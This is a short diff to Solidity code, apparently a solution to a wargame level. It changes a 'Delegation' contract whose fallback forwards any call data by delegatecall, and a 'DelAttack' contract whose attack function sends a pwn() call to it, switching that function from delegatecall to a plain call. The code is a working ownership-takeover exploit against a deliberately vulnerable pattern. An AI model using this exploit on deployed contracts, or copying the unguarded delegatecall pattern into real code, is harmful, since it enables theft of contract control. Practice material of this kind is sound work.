@@ -22,8 +22,11 @@ contract Delegation {
         owner = msg.sender;
     }
 
+    uint256 public count;
+
     fallback() external {
         (bool result, ) = address(delegate).delegatecall(msg.data);
+        count++;
         if (result) {
             this;
         }
@@ -37,10 +40,10 @@ contract DelAttack {
         x = Delegation(_delegationAddress);
     }
 
-    function attack() external returns (address) {
-        (bool succ, ) = address(x).delegatecall(
-            abi.encodeWithSignature("pwn()")
-        );
+    bytes4 public sel = bytes4(abi.encodeWithSignature("pwn()"));
+
+    function attack() external {
+        (bool succ, ) = address(x).call(abi.encodeWithSignature("pwn()"));
         require(succ, "Call failed");
     }
 }
